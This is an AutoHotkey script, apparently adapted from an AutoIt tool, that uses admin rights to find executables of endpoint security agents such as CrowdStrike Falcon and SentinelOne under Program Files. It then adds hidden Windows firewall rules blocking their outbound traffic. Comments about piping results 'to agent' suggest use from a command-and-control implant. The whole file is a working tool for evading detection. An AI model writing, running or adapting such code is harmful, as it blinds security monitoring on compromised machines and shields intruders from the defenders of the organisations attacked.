#Requires AutoHotkey v2.0

/* 
Based on AutoIt version created by https://github.com/rayzax 
Requires Admin rights
*/

IsTargetFile(filename) {
    ; Convert filename to lowercase for case-insensitive comparison
    filename := StrLower(filename)
    ; Array of target basenames
    targets := ["csfalconservice", "sentinelone", "nwmagent", "agent"]
    
    ; Extract basename (remove extension)
    SplitPath filename,,, , &baseName
    baseName := StrLower(baseName)
    
    ; Check if basename matches any target
    for target in targets {
        if (baseName = target)
            return true
    }
    return false
}

FindEDRFiles(searchPath) {
    matchingFiles := []
    
    try {
        ; Recursive search through Program Files
        Loop Files, searchPath "\*.exe", "R"  ; R for recursive
        {
            if IsTargetFile(A_LoopFileName) {
                matchingFiles.Push(A_LoopFileFullPath)
            }
        }
    } catch Error as err {
        ; TODO: Add error handling for agent execution.
    }
    
    return matchingFiles
}

if A_IsAdmin {
    matchingFiles := FindEDRFiles("C:\Program Files")
    
    if matchingFiles.Length > 0 {
        ; TODO: Pipe to agent `"Found " matchingFiles.Length " matching files"`
        
        ; Process each found file
        for filePath in matchingFiles {
            ; Extract filename
            SplitPath filePath, &fileName
            
            ; Create and execute netsh command
            netshCommand := 'netsh advfirewall firewall add rule name="Deny Outbound for ' fileName '" dir=out action=block program="' filePath '" enable=yes'
            
            ; TODO: Pipe to agent `"Creating firewall rule for: " fileName "`nPath: " filePath`
            
            try {
                RunWait netshCommand,, "Hide"
                ; TODO: Pipe to agent `"Successfully added firewall rule for: " fileName`
            } catch Error as err {
                ; TODO: Pipe to agent `"Error adding firewall rule for " fileName ": " err.Message " at line " err.Line`
            }
        }
        
        ; TODO: Pipe to agent `"Process complete - all firewall rules have been added."`
    } else {
        ; TODO: Pipe to agent `"No matching files found in Program Files"`
    }
}




